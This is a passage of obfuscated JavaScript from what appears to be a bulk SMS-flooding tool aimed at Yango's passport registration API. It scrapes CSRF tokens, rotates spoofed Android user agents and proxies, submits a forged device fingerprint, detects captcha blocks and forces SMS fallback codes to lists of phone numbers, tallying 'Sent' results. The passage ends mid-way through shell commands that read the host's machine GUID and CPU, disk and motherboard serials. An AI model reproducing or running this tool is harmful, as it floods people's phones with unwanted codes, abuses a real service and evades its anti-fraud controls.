'uKuG4Ocu', 'oty4', 'Aw50', 'CMLUzW', 'AM9PBG', 'BwLU', 'zY4GmG', 'zwqGDa', 'BunKyW', 'mtq0mq', 'v0Tera', 'uKyGDa', 'yw1L', '4PYxievY', 'z3jHEq', 'EeXVsG', 'ihWGsa', 'ihrHCG', 'rez6Ba', 'lhrYDq', 'CfjXAq', 'DhLWzq', 'vxn5Eq', 'zMf1Ba', 'DYbRzq', 'mJu3', 'ig51Bq', 'ic9FlW', 'ls0ktq', 'yxvSDa', 'l3zLCG', 'zw5JAq', 'ntK1', 'BfHfsW', 'yxjJAa', '4PYxifnH', 'mZyWla', 'refKrq', 'iIbPBG', 'zxjbzW', 'ohDlv2XOAW', 'mJe2', 'ndK2oa', 'BcbJAa', 'zhmPia', 'DxrOlW', 'rg1uDq', 'zsWIDW', 'zw5KCW', 'BMv4yq', 'Aw4GjW', 'Dg9jCq', 'ANnFzG', 'r0vu', 'vNHtyG', 'mZu4', 'qxmZBW', 'iIWIyq', 'mLz3qq', 'ptKMBq', 'mNWW', 'nZeWnJqYt2DrwMvm', 'vujmsq', 'Eg1Sla', 'ifvWza', 'zw1WDa', 'DxG7ia', 'v2zjCW', 'oMzHBa', 'zcbUDq', 'zMLSDa', 'DKHWrq', 'zwjlAq', 'yw5VDa', 'x2nHBa', 'mZu1', 'wg10qW', 'zwrmyq', 'mZC4', 'DhvZia', 'Es1HzW', 'l21HyW', 'C2fhwa', 'ntKY', 'nJC0', 'y3rLza', 'C1PHrW', '4Pwq4Pwq4Pwq4PwJ', 'ks4Gvq', 'rKHbCq', 'qvjfxa', 'igzVCG', 'zxzPyW', 'igLUCW', 'x2fSBa', 'EunVBG', 'vw5RBG', 'iZaWqG', 'mZC0', 'zgvSzq', 'ienVBG', 'mtG2oa', 'C0vqCa', 'mJqWma', 'zxHPDa', 'DwLYzq', 'B2LK', 'wZmZBq', 'Bg1vsW', 'nJGZ', 'zM9YxW', 'ntK5', 'lJe5ma', 'tM90kq', 'ExbjAG', 'zxjZlW', 'mZuX', 'ns44mG', 'y21K', 'FdL8nW', 'Aw1Lia', '4PYtifrO', 'Bwnuuq', 'oti4ia', 'xe1PyW', 'zMLSzq', 'CgfYCW', '4Pwq4Pwq4Pwq4PwD', 'v0zdzW', 'nxWXFa', 'zxiGmG', 'mty0oq', 'q2fWDa', 'ignWDq', 'q29VAW', '4P6ug1SZ', 'y2HHlG', 'B3nVzG', 'ueDKtW', 'mJe3mdKYngf2Dwfjvq', 'B3qGzW', 'psDdoG', 'zgLYBG', 'y2eIla', 'lwLK', 'rxPNqq', 'zw1PDa', 'yw5KiG', 'B21LlW', 't1DftG', 'whfOEG', 'BgvUDa', 'zw5K', 'nduUmq', 'CNzLCG', 'zs9ZDq', 'wvzVEq', 'AwXLza', 'q3HVqG', 'CIbttq', 'BgX5iq', 'EvLpta', 'yw9KzW', 'lgfWCa', 'icbzqq', 'tY1wmq', 'CMvNAq', 'zfjLBG', 'zxiGjW', 'nteUmq', 'AhKNia', 'BhvNAq', 'mJi3', 'zs4UlG', 'nJC5', 'Fdf8mq', 'ihrVia', 'vfvqxq', 'u0vmrq', 'ienVDq', '8j+mKcbbDq', 'mJiW', 'zxqTqW', 'Fcb8ia', 'zxnZBW', 'zw9OCa', 'CMvHCW', 'B25Uzq', 'BNbTlG', 'icaG', 'AevoqG', 'mtyZ', 'mZC1', 'uYXLBG', 'Cgf1CW', 'sgHmqG', 'mJeY', 's0nfEq', 'zxiGmW', 'Bsbozq', 'l2v0yW', 'zxiGmq', 'zsbSyq', 'zxnZpW', 'DI9UDq', 'u2vUDa', 'FhLHBG', 'yxzPzG', 'otC0', 'iZaWrG', 'mJq2', 'BgfUAW', 'zsWIAq', 'DMrnrW', 'Exb0BW', 'msiSiG', 'A2v5ia', 'B20UEq', 'zxHJAa', 'if9FxW', 'BMn5iG', 'zgv2Aq', 'ieLUDa', 'rxzLBG', 'rhzprG', 'B3iGka', 'y2SIoG', 'nJC3', 'CM9YoG', 'oLWNjW', 'A19MBW', 'zxvXzW', 'EvbXvG', 'yv9HCa', 'DgvKlq', 'zwjWla', 'CgzRyq', 'z3jLzq', 'v3jAwG', 'zM9YBq', 'yY9JCa', 'l3bYBW', 'tNnfDW', 'icbqCG', 'Fdz8nq', 'CIaVia', 'yxjNDG', 'yNfVva', 'z2vYzq', 'psaOrW', 'ugf0Aa', 'mZC3', 'rgvSzq', 'rxjYBW', 'mti2na', 'zLb3Bq', 'CMvTBW', 'q293qG', 'vNv6wa', 'vfrqkq', 've1mla', 'y2vFyW', 'zsWIDa', 'BgXPBG', 'x18Gia', 'yxbPsW', 'icHUDq', 'A2vYia', 'ihzLCG', 'zxf1Aq', 'DgvYBG', 'mJy4', 'Dg1SkW', 'u3vJyW', 'AY9JCG', 'u2HSrG', 're5Nsa', 'u2vSzq', 'Dvzsta', 'oYbbBG', 'otC1', 'B21HBG', 'ieLelG', 'DgHLBq', 'lZuZnW', 'BgjHyW', 'yxrLia', 'BwfW', 'C2v0lq', 'ywnO', 'tgncqW', 'zM9YyW', 'ieHxsq', 'yuDezW', 'ufDPCq', 'D0jmEq', 'Bca1', 'zsWIBa', 'zw5Zzq', 'w1rjtq', 'otCX', 'ihbOBW', 'r3PIqq', 'vvbDia', 'CYbRzq', 'isbqBa', 'igrPCG', 'Dg9gAq', 'mM0G', 'mtKZoq', 'nta5', 'C2TPvG', 'ihWVia', 'CYbSBW', 'BgLNAa', 'ifbYBW', 'y2TVkq', 'ywDLiG', 'u3vWCa', 'if9Fia', 'Aw9U', 'tezwrG', 'Aci6mG', 'mty4na', 'ntqYmdiZouT3svLcsG', 'CMuGiG', 'mc42mG', 'luvYCG', 'zxjFAW', 'C3rLBG', 'yxnmAq', 'zxmU', 'nJC4', 'tgLJzq', 'mJuZ', 'C3rHBq', 'Dw5Kia', 'otK4', 'DhnxAq', 'zxjUyq', 'Benevq', 'zvv0tq', 't1zfra', 'z2v0CW', 'oIbxyq', 'mJm2', 'mteYna', '4PYtiefq', 'DhbiAG', 'luHbuG', 'BgWGFa', 'EsaIsa', 'vvfcwq', 'C2HHmG', 'A2PZyW', 'Dw5SAq', 'Cg9YDa', 'zw50', 'mti4na', 'zcb0Aa', 'mtqWnZaWourNyLjzsa', 'mtiWlG', 'ywDLlW', 'ywWIla', 'mtiXlG', 'z2uVDW', 'zw50zq', 'y3KGqG', 'mtiYlG', 'BKPtrW', 'B25LtW', 'u2nYyq', 'mdCXmq', 'BgqV', 'mJiX', 'otCZ', 'mdeY', 'z298mq', 'De1HCW', 'yxrPBW', 'mJmW', 'sw5ZDa', 'oduZ', 'BgLUzq', 'mJiWmW', '4Pwq4Pwq4Pwq4Pwq', 'BenVDq', 'zhjVAq', 'C0XPzq', 'q25JrW', 'yMLSAq', 'C2nYzq', 'BMvS', 'B2DPyW', 'u3LUyW', 'ihXFFa', 'yw5Kia', 'AgLUzq', 'zgvZDa', 'o3e9ma', 'icdINjmG', 'BcXHCa', 'zNrCqW', 'uerNDa', 'oIbUDq', 's3LfAa', 'drTBsW', 'jYbJCG', 'r25HDW', 'zgLHBa', 'BgDHEG', 'sfzsuq', 'r1bryG', 'icdILztILza', 'keXPBG', 'icaGFa', 'rxnwEa', 'oIb0lG', 'BMrLEa', 'nJCY', 'AKPnwq', 'y3LHBG', 'BKvSta', 'AwDisG', 'y2fSzq', 'CMv0Dq', 'y3j5Ca', 'g1SZsG', 'yxr1CW', 'icdILzRILza', 'otyX', 'BNvTyG', 'y3jHCa', 'Df06', 'C3rLCG', 'mJm5', 'y0T2za', 'igzYBW', 'ruf6vW', 'qw5KCG', 'DcbduW'];
  fn1 = function () {
    return v15;
  };
  return fn1();
}
function sendRequest(v16, v17, v18, v19, v20 = null, v21 = 15000) {
  return new Promise((v22, v23) => {
    const v24 = new URL(v16);
    const v25 = {
      ...v18
    };
    let v26 = v25;
    v19 && (v26["Content-Length"] = Buffer.byteLength(v19));
    const v27 = {
      'hostname': v24.hostname,
      'path': v24.pathname + v24.search,
      'method': v17,
      'headers': v26,
      'timeout': v21
    };
    let v28 = v20 ? parseProxy(v20) : null;
    v20 && v28 && (v27.agent = createProxyAgent(v28));
    const v29 = https.request(v27, v30 => {
      const v31 = [];
      v30.on("data", v32 => v31.push(v32)), v30.on("error", v23);
      v30.on("end", () => {
        let v33 = Buffer.concat(v31).toString("utf8");
        const v34 = {};
        v34.status = v30.statusCode, v34.data = v33;
        v34.headers = v30.headers, v22(v34);
      });
    });
    v29.on("error", v23), v29.on("timeout", () => {
      v29.destroy(), v23(new Error("timeout"));
    });
    if (v19) v29.write(v19);
    v29.end();
  });
}
const v1 = {};
v1["1242"] = 'bs', v1["1246"] = 'bb', v1["1264"] = 'ai', v1["1268"] = 'ag', v1["1284"] = 'vg', v1["1340"] = 'vi', v1["1345"] = 'ky', v1["1441"] = 'bm', v1["1473"] = 'gd', v1["1649"] = 'tc', v1["1664"] = 'ms', v1["1721"] = 'sx', v1["1758"] = 'lc', v1["1767"] = 'dm', v1["1784"] = 'vc', v1["1809"] = 'do', v1["1829"] = 'do', v1["1849"] = 'do', v1["1868"] = 'tt', v1["1876"] = 'jm', v1["1939"] = 'pr', v1["1671"] = 'gu', v1["1670"] = 'mp', v1["1684"] = 'as', v1['1'] = 'us', v1['7'] = 'ru', v1['20'] = 'eg', v1['27'] = 'za', v1['30'] = 'gr', v1['31'] = 'nl', v1['32'] = 'be', v1['33'] = 'fr', v1['34'] = 'es', v1['36'] = 'hu', v1['39'] = 'it', v1['40'] = 'ro', v1['41'] = 'ch', v1['43'] = 'at', v1['44'] = 'gb', v1['45'] = 'dk', v1['46'] = 'se', v1['47'] = 'no', v1['48'] = 'pl', v1['49'] = 'de', v1['51'] = 'pe', v1['52'] = 'mx', v1['53'] = 'cu', v1['54'] = 'ar', v1['55'] = 'br', v1['56'] = 'cl', v1['57'] = 'co', v1['58'] = 've', v1['60'] = 'my', v1['61'] = 'au', v1['62'] = 'id', v1['63'] = 'ph', v1['64'] = 'nz', v1['65'] = 'sg', v1['66'] = 'th', v1['81'] = 'jp', v1['82'] = 'kr', v1['84'] = 'vn', v1['86'] = 'cn', v1['90'] = 'tr', v1['91'] = 'in', v1['92'] = 'pk', v1['93'] = 'af', v1['94'] = 'lk', v1['95'] = 'mm';
v1['98'] = 'ir', v1["211"] = 'ss', v1["212"] = 'ma', v1["213"] = 'dz', v1["216"] = 'tn', v1["218"] = 'ly', v1["220"] = 'gm', v1["221"] = 'sn', v1["222"] = 'mr', v1["223"] = 'ml', v1["224"] = 'gn', v1["225"] = 'ci', v1["226"] = 'bf', v1["227"] = 'ne', v1["228"] = 'tg', v1["229"] = 'bj', v1["230"] = 'mu', v1["231"] = 'lr', v1["232"] = 'sl', v1["233"] = 'gh', v1["234"] = 'ng', v1["235"] = 'td', v1["236"] = 'cf', v1["237"] = 'cm', v1["238"] = 'cv', v1["239"] = 'st', v1["240"] = 'gq', v1["241"] = 'ga', v1["242"] = 'cg', v1["243"] = 'cd', v1["244"] = 'ao', v1["245"] = 'gw', v1["246"] = 'io', v1["248"] = 'sc', v1["249"] = 'sd', v1["250"] = 'rw', v1["251"] = 'et', v1["252"] = 'so', v1["253"] = 'dj', v1["254"] = 'ke', v1["255"] = 'tz', v1["256"] = 'ug', v1["257"] = 'bi', v1["258"] = 'mz', v1["260"] = 'zm', v1["261"] = 'mg', v1["262"] = 're', v1["263"] = 'zw', v1["264"] = 'na', v1["265"] = 'mw', v1["266"] = 'ls', v1["267"] = 'bw', v1["268"] = 'sz', v1["269"] = 'km', v1["290"] = 'sh', v1["291"] = 'er', v1["297"] = 'aw', v1["298"] = 'fo', v1["299"] = 'gl', v1["350"] = 'gi', v1["351"] = 'pt', v1["352"] = 'lu', v1["353"] = 'ie', v1["354"] = 'is', v1["355"] = 'al', v1["356"] = 'mt', v1["357"] = 'cy', v1["358"] = 'fi', v1["359"] = 'bg', v1["370"] = 'lt', v1["371"] = 'lv', v1["372"] = 'ee', v1["373"] = 'md', v1["374"] = 'am', v1["375"] = 'by', v1["376"] = 'ad', v1["377"] = 'mc', v1["378"] = 'sm', v1["379"] = 'va', v1["380"] = 'ua', v1["381"] = 'rs', v1["382"] = 'me', v1["385"] = 'hr', v1["386"] = 'si', v1["387"] = 'ba', v1["389"] = 'mk', v1["420"] = 'cz', v1["421"] = 'sk', v1["423"] = 'li', v1["500"] = 'fk', v1["501"] = 'bz', v1["502"] = 'gt', v1["503"] = 'sv', v1["504"] = 'hn', v1["505"] = 'ni', v1["506"] = 'cr', v1["507"] = 'pa', v1["508"] = 'pm', v1["509"] = 'ht', v1["590"] = 'gp', v1["591"] = 'bo', v1["592"] = 'gy', v1["593"] = 'ec', v1["594"] = 'gf', v1["595"] = 'py', v1["596"] = 'mq', v1["597"] = 'sr', v1["598"] = 'uy', v1["599"] = 'cw', v1["670"] = 'tl', v1["672"] = 'nf', v1["673"] = 'bn', v1["674"] = 'nr', v1["675"] = 'pg';
v1["676"] = 'to', v1["677"] = 'sb', v1["678"] = 'vu', v1["679"] = 'fj', v1["680"] = 'pw', v1["681"] = 'wf', v1["682"] = 'ck', v1["683"] = 'nu', v1["685"] = 'ws', v1["686"] = 'ki', v1["687"] = 'nc', v1["688"] = 'tv', v1["689"] = 'pf', v1["690"] = 'tk', v1["691"] = 'fm', v1["692"] = 'mh', v1["850"] = 'kp', v1["852"] = 'hk', v1["853"] = 'mo', v1["855"] = 'kh', v1["856"] = 'la', v1["880"] = 'bd', v1["886"] = 'tw', v1["960"] = 'mv', v1["961"] = 'lb', v1["962"] = 'jo', v1["963"] = 'sy', v1["964"] = 'iq', v1["965"] = 'kw', v1["966"] = 'sa', v1["967"] = 'ye', v1["968"] = 'om', v1["970"] = 'ps', v1["971"] = 'ae', v1["972"] = 'il', v1["973"] = 'bh', v1["974"] = 'qa', v1["975"] = 'bt', v1["976"] = 'mn', v1["977"] = 'np', v1["992"] = 'tj', v1["993"] = 'tm', v1["994"] = 'az', v1["995"] = 'ge', v1["996"] = 'kg', v1["998"] = 'uz';
const COUNTRY_CODES = v1;
function getCountry(v35) {
  for (let v37 = 4; v37 >= 1; v37--) {
    const v38 = v35.substring(0, v37);
    if (COUNTRY_CODES[v38]) return {
      'iso': COUNTRY_CODES[v38],
      'dialCode': '+' + v38
    };
  }
  const v36 = {};
  v36.iso = 'us', v36.dialCode = '+1';
  return v36;
}
function getRandomUserAgent() {
  const v39 = ['9', '10', '11', '12', '13'],
    v40 = v39[Math.floor(Math.random() * v39.length)],
    v41 = ["SM-G973F", "SM-G981B", "SM-G991B", "SM-S901B", "SM-A525F", "SM-A536B", "M2101K6G", "M2102J20SG", "2201117TY", "2203129G", "Pixel 4", "Pixel 5", "Pixel 6", "Pixel 7", "CPH2173", "CPH2211", "RMX3301", "RMX3363"],
    v42 = v41[Math.floor(Math.random() * v41.length)],
    v43 = ["QP1A.190711.020", "RP1A.200720.012", "SP1A.210812.016", "TP1A.220624.014", "TKQ1.220829.002"],
    v44 = v43[Math.floor(Math.random() * v43.length)],
    v45 = ["118.0.5993.111", "119.0.6045.163", "120.0.6099.116", "121.0.6167.164", "122.0.6261.64"],
    v46 = v45[Math.floor(Math.random() * v45.length)];
  return "Mozilla/5.0 (Linux; Android " + v40 + ';\x20' + v42 + " Build/" + v44 + "; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/" + v46 + " Mobile Safari/537.36 PassportSDK/7.51.12.751124928 com.yandex.yango/5.82.1";
}
async function triggerSms(v47, v48, v49, v50) {
  const v51 = v47.replace(/\D/g, ''),
    v52 = '+' + v51;
  const v53 = getCountry(v51),
    v54 = v53.iso,
    v55 = v53.dialCode,
    v56 = crypto.randomBytes(16).toString("hex"),
    v57 = crypto.randomUUID(),
    v58 = getRandomUserAgent();
  try {
    v50.setStatus("Worker " + v49 + ": Fetching CSRF...");
    const v59 = {};
    v59["User-Agent"] = v58, v59.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", v59["X-Requested-With"] = "com.yandex.yango";
    const v60 = v59,
      v61 = "https://passport.yango.com/pwl/auth/phone?lang=en&locale=US&app_id=com.yandex.yango&app_platform=android&device_id=" + v56 + "&uuid=" + v57 + "&connection_type=9&mode=phonish",
      v62 = await sendRequest(v61, "GET", v60, null, v48, 15000);
    let v63 = null;
    const v64 = v62.data.match(/window\.__CSRF__\s*=\s*"([^"]+)";/);
    v64 && (v63 = v64[1]);
    if (!v63) {
      const v100 = {};
      return v100.success = false, v100.message = "Failed to extract CSRF token", v100.phone = v52, v100;
    }
    let v65 = [];
    v62.headers["set-cookie"] && (v65 = v62.headers["set-cookie"].map(v101 => v101.split(';')[0]));
    const v66 = Math.floor(Date.now() / 1000),
      v67 = '' + v66 + Math.floor(Math.random() * 900000000 + 100000000);
    v65.push("_ym_uid=" + v67), v65.push("_ym_d=" + v66), v65.push("_ym_isad=2"), v65.push("theme=light");
    const v68 = {
      ...v60,
      'Accept': "*/*",
      'Content-Type': "application/json",
      'Origin': "https://passport.yango.com",
      'Referer': "https://passport.yango.com/",
      'X-Csrf-Token': v63,
      'Cookie': v65.join(';\x20'),
      'c11n': "yango_taxi",
      'tractor-location': '',
      'process-uuid': v57,
      'sec-ch-ua': "\"Android WebView\";v=\"149\", \"Chromium\";v=\"149\", \"Not)A;Brand\";v=\"24\"",
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': "\"Android\"",
      'sec-ch-prefers-color-scheme': "light",
      'Sec-Fetch-Site': "same-origin",
      'Sec-Fetch-Mode': "cors",
      'Sec-Fetch-Dest': "empty",
      'Accept-Language': "en-US,en;q=0.9"
    };
    v50.setStatus("Worker " + v49 + ": Creating Track...");
    const v69 = "https://passport.yango.com/pwl/api/passport/track/create",
      v70 = {};
    v70.display_language = 'en', v70.language = 'en', v70.country = v54, v70.app_id = "com.yandex.yango", v70.app_version_name = "5.82.1", v70.retpath = '', v70.device_id = v56, v70.uid = '', v70.device_connection_type = '9';
    const v71 = JSON.stringify(v70),
      v72 = await sendRequest(v69, "POST", v68, v71, v48, 15000);
    if (v72.headers && v72.headers["set-cookie"]) {
      const v102 = v72.headers["set-cookie"].map(v103 => v103.split(';')[0]);
      v65 = [...v65, ...v102], v68.Cookie = v65.join(';\x20');
    }
    let v73 = null;
    try {
      const v104 = JSON.parse(v72.data);
      v73 = v104.id || v104.track_id;
    } catch (v105) {}
    if (!v73) {
      const v106 = {};
      return v106.success = false, v106.message = "Failed to create track ID", v106.phone = v52, v106;
    }
    const v74 = "https://passport.yango.com/pwl/api/passport/checkjscssload",
      v75 = {};
    v75.track_id = v73, v75.display_language = 'en', v75.language = 'en', v75.check_js_load = true, await sendRequest(v74, "POST", v68, JSON.stringify(v75), v48, 10000);
    const v76 = {};
    v76.track_id = v73, v76.display_language = 'en', v76.language = 'en', v76.check_css_load = true, await sendRequest(v74, "POST", v68, JSON.stringify(v76), v48, 10000);
    let v77 = v52;
    if (v54 === 'bd' && v52.length === 14) v77 = "+880 (" + v52.slice(4, 6) + ')\x20' + v52.slice(6, 9) + '\x20' + v52.slice(9);else v54 === 'np' && v52.length === 14 && (v77 = "+977 " + v52.slice(4, 7) + '-' + v52.slice(7));
    const v78 = "https://passport.yango.com/pwl/api/passport/suggest/check_availability",
      v79 = {};
    v79.track_id = v73, v79.check_for_push = true, v79.push_suggest_log_all_subscriptions = false, v79.phone_number = v77;
    const v80 = JSON.stringify(v79),
      v81 = await sendRequest(v78, "POST", v68, v80, v48, 15000);
    if (v81.headers && v81.headers["set-cookie"]) {
      const v107 = v81.headers["set-cookie"].map(v108 => v108.split(';')[0]);
      v65 = [...v65, ...v107], v68.Cookie = v65.join(';\x20');
    }
    const v82 = "https://passport.yango.com/pwl/api/passport/track/update",
      v83 = {};
    v83.track_id = v73, v83.scenario = "register", v83.process_name = "web_registration";
    const v84 = JSON.stringify(v83),
      v85 = await sendRequest(v82, "POST", v68, v84, v48, 15000);
    if (v85.headers && v85.headers["set-cookie"]) {
      const v109 = v85.headers["set-cookie"].map(v110 => v110.split(';')[0]);
      v65 = [...v65, ...v109], v68.Cookie = v65.join(';\x20');
    }
    v50.setStatus("Worker " + v49 + ": Validating phone...");
    const v86 = "https://passport.yango.com/pwl/api/passport/validate/phone_number",
      v87 = {};
    v87.mask = v55 + " 000000000000", v87.startDialCode = v55, v87.startMask = v55 + " 000000000000";
    const v88 = {};
    v88.track_id = v73, v88.validate_for_call = false, v88.force_check_for_protocols = true, v88.phone_number = v77, v88.country = v54, v88.statInfo = v87;
    const v89 = JSON.stringify(v88),
      v90 = await sendRequest(v86, "POST", v68, v89, v48, 15000);
    if (v90.headers && v90.headers["set-cookie"]) {
      const v111 = v90.headers["set-cookie"].map(v112 => v112.split(';')[0]);
      v65 = [...v65, ...v111], v68.Cookie = v65.join(';\x20');
    }
    try {
      const v113 = JSON.parse(v90.data);
      v113.track_id && (v73 = v113.track_id);
    } catch (v114) {}
    const v91 = {};
    v91.track_id = v73, v91.display_language = 'en', v91.language = 'en', v91.check_js_load = true, await sendRequest(v74, "POST", v68, JSON.stringify(v91), v48, 10000);
    const v92 = {};
    v92.track_id = v73, v92.display_language = 'en', v92.language = 'en', v92.check_css_load = true, await sendRequest(v74, "POST", v68, JSON.stringify(v92), v48, 10000);
    const v93 = "https://passport.yango.com/pwl/api/passport/confirm_phone/submit",
      v94 = {};
    v94.number = v52, v94.track_id = v73, v94.display_language = 'en', v94.gps_package_name = "com.yandex.yango", v94.force_check_for_protocols = true, v94.country = v54, v94.code_format = '', v94.scenario = "REGISTER", v94.transport = '';
    const v95 = JSON.stringify(v94),
      v96 = await sendRequest(v93, "POST", v68, v95, v48, 15000),
      v97 = "https://passport.yango.com/pwl/api/passport/js_fingerprint",
      v98 = {};
    v98.track_id = v73, v98.display_language = 'en', v98.language = 'en', v98.fingerprint = "{\"userAgent\":\"Mozilla/5.0 (Linux; Android 10; SM-G981B Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/118.0.5993.111 Mobile Safari/537.36 PassportSDK/7.51.12.751124928 com.yandex.yango/5.82.1\",\"language\":\"en-US\",\"colorDepth\":24,\"deviceMemory\":8,\"hardwareConcurrency\":8,\"screenResolution\":[1080,2400],\"availableScreenResolution\":[1080,2400],\"timezoneOffset\":-360,\"sessionStorage\":true,\"localStorage\":true,\"indexedDb\":true,\"addBehavior\":false,\"openDatabase\":true,\"cpuClass\":\"unknown\",\"platform\":\"Linux armv8l\",\"plugins\":[],\"canvas\":true,\"webgl\":true,\"webglVendorAndRenderer\":\"ARM~Mali-G77\",\"adBlock\":false,\"hasLiedLanguages\":false,\"hasLiedResolution\":false,\"hasLiedOs\":false,\"hasLiedBrowser\":false,\"touchSupport\":[5,true,true],\"fonts\":[\"Arial\",\"Courier\",\"Courier New\",\"Helvetica\",\"Times\",\"Times New Roman\"],\"audio\":\"124.04344968475198\"}";
    const v99 = JSON.stringify(v98);
    try {
      await sendRequest(v97, "POST", v68, v99, v48, 10000);
    } catch (v115) {}
    try {
      if (v81.data && v81.data.includes("\"antifraudScore\":\"captcha\"")) {
        const v117 = {};
        return v117.success = false, v117.message = "Captcha Required", v117.phone = v52, v117;
      }
      if (v81.data && v81.data.includes("phone_number.invalid")) {
        const v118 = {};
        return v118.success = false, v118.message = "Invalid Phone Number", v118.phone = v52, v118;
      }
      const v116 = JSON.parse(v96.data);
      if (v116.deny_resend_until || v116.code_length) {
        const v119 = {};
        v119.number = v52, v119.track_id = v73, v119.display_language = 'en', v119.gps_package_name = "com.yandex.yango", v119.force_check_for_protocols = true, v119.country = v54, v119.code_format = '', v119.scenario = "REGISTER", v119.transport = "sms";
        const v120 = JSON.stringify(v119);
        try {
          v50.setStatus("Worker " + v49 + ": Waiting 10s for SMS fallback..."), await new Promise(v123 => setTimeout(v123, 10000)), v50.setStatus("Worker " + v49 + ": Triggering SMS fallback...");
          const v122 = await sendRequest(v93, "POST", v68, v120, v48, 15000);
          fs.appendFileSync(DEBUG_FILE, '[' + v52 + "] SMS Submit HTTP: " + v122.status + "\nSMS Submit: " + v122.data + '\x0a\x0a');
        } catch (v124) {}
        const v121 = {};
        return v121.success = true, v121.message = "OTP Triggered ✓", v121.phone = v52, v121;
      } else {
        if (v116.status === "error" && v116.errors && v116.errors.includes("captcha.required")) {
          const v125 = {};
          return v125.success = false, v125.message = "Captcha Required", v125.phone = v52, v125;
        } else return {
          'success': false,
          'message': "Failed: " + JSON.stringify(v116.errors || v116.code || v116),
          'phone': v52
        };
      }
    } catch (v126) {
      const v127 = {};
      return v127.success = false, v127.message = "Failed: HTTP " + v96.status, v127.phone = v52, v127;
    }
  } catch (v128) {
    const v129 = {};
    return v129.success = false, v129.message = "Failed: Network Error / Timeout", v129.phone = v52, v129;
  }
}
class Dashboard {
  constructor(v130) {
    {
      this.totalNumbers = v130;
      this.processed = 0;
      this.successful = 0;
      this.failed = 0;
      this.startTime = Date.now();
      this.currentStatus = '';
    }
  }
  ["addLog"](v131, v132) {
    let v133 = '';
    if (v132 === "success") v133 = B("[YANGO] [SUCCESS]");else {
      if (v132 === "time") v133 = Y("[TIME]");else v133 = R("[ERROR]");
    }
    const v134 = v133 + '\x20' + v131;
    process.stdout.write("\r[K" + v134 + '\x0a');
    this.render();
  }
  ["setStatus"](v135) {}
  ["render"]() {
    const v136 = (this.processed / Math.max(this.totalNumbers, 1) * 100).toFixed(1),
      v137 = '\x20\x20' + W.bold("YANGO") + " ⮞ [" + this.processed + '/' + this.totalNumbers + ']\x20' + v136 + "% │ " + B("Sent: " + this.successful) + " │ " + R("Err: " + this.failed);
    process.stdout.write("\r[K" + v137);
  }
  ["stop"]() {
    process.stdout.write("[2K\r\n");
    const v138 = Math.floor((Date.now() - this.startTime) / 1000),
      v139 = Math.floor(v138 / 60),
      v140 = v138 % 60,
      v141 = v139 + 'm\x20' + v140 + 's';
    console.log(C("  ╔════════════════════════════════════════════╗")), console.log(C("  ║") + W.bold("  YANGO SMS TRIGGER — COMPLETE              ") + C('║'));
    console.log(C("  ╠════════════════════════════════════════════╣")), console.log(C("  ║") + ('\x20\x20' + chalk.greenBright("Successful") + "   " + chalk.greenBright(String(this.successful).padStart(6)) + "                       ") + C('║'));
    console.log(C("  ║") + ('\x20\x20' + chalk.red("Failed") + "       " + chalk.red(String(this.failed).padStart(6)) + "                       ") + C('║')), console.log(C("  ║") + ('\x20\x20' + chalk.cyan("Total Time") + "   " + chalk.cyan(v141.padEnd(6)) + "                       ") + C('║'));
    console.log(C("  ╚════════════════════════════════════════════╝\n"));
  }
}
async function promptText(v142, v143) {
  return new Promise(v144 => {
    process.stdout.write("   [33m" + v142 + "[0m ");
    let v145 = '';
    if (process.stdin.isTTY) process.stdin.setRawMode(false);
    process.stdin.resume();
    const fn2 = v146 => {
      const v147 = v146.toString();
      if (v147.includes('\x0a') || v147.includes('\x0d')) {
        process.stdin.removeListener("data", fn2), v145 += v147.split(/[\r\n]/)[0];
        let v148 = v145.trim();
        if (v148.startsWith('\x22') && v148.endsWith('\x22')) v148 = v148.slice(1, -1);else v148.startsWith('\x27') && v148.endsWith('\x27') && (v148 = v148.slice(1, -1));
        v144(v148 || v143);
      } else v145 += v147;
    };
    process.stdin.on("data", fn2);
  });
}
async function selectOption(v149, v150) {
  return new Promise(v151 => {
    let v152 = 0;
    process.stdin.resume(), readline.emitKeypressEvents(process.stdin);
    if (process.stdin.isTTY) process.stdin.setRawMode(true);
    const fn3 = () => {
      process.stdout.write("[2J[H"), printHeader(), console.log("   [33m" + v149 + "[0m\n"), v150.forEach((v153, v154) => {
        v154 === v152 ? console.log("   [36m➔[32m " + v153.name + "[0m") : console.log("     [90m" + v153.name + "[0m");
      });
    };
    fn3();
    const fn4 = (v155, v156) => {
      v156.ctrl && v156.name === 'c' && process.exit(0);
      if (v156.name === 'up') v152 = (v152 - 1 + v150.length) % v150.length, fn3();else {
        if (v156.name === "down") v152 = (v152 + 1) % v150.length, fn3();else v156.name === "return" && (process.stdin.setRawMode(false), process.stdin.removeListener("keypress", fn4), v151(v150[v152].value));
      }
    };
    process.stdin.on("keypress", fn4);
  });
}
async function start() {
  function fn5() {
    const v181 = require('os');
    const v182 = v181.platform();
    try {
      if (v182 === "win32") {
        let v183 = '';
        try {
          v183 = execSync('powershell -NoProfile -ExecutionPolicy Bypass -Command "$mg = (Get-ItemProperty \'HKLM:\\SOFTWARE\\Microsoft\\Cryptography\' -ErrorAction SilentlyContinue).MachineGuid; $cpu = (Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1).ProcessorId; $disk = (Get-CimInstance Win32_LogicalDisk -Filter \'DeviceID=\\\'C:\\\'\' -ErrorAction SilentlyContinue).VolumeSerialNumber; $mb = (Get-CimInstance Win32_BaseBoard -ErrorAction SilentlyContinue).SerialNumber; Write-Output (($mg,$cpu,$disk,$mb) -join \'|\')"', {
            'stdio': "pipe",
            'timeout': 0x1388
          }).toString().trim();
        } catch (v185) {}
        if (!v183 || v183.replace(/\|/g, '').length < 5) try {
          const v186 = execSync("reg query \"HKLM\\SOFTWARE\\Microsoft\\Cryptography\" /v MachineGuid", {
              'stdio': "pipe",
              'timeout': 0xbb8
            }).toString().match(/MachineGuid\s+REG_SZ\s+(\S+)/i)?.[1] || '',
            v187 = execSync("wmic cpu get ProcessorId", {
              'stdio': "pipe",
              'timeout': 0xbb8
            }).toString().split('\x0a')[1]?.["trim"]() || '',
            v188 = execSync("wmic logicaldisk where \"DeviceID='C:'\" get VolumeSerialNumber", {
              'stdio': "pipe",
              'timeout': 0xbb8
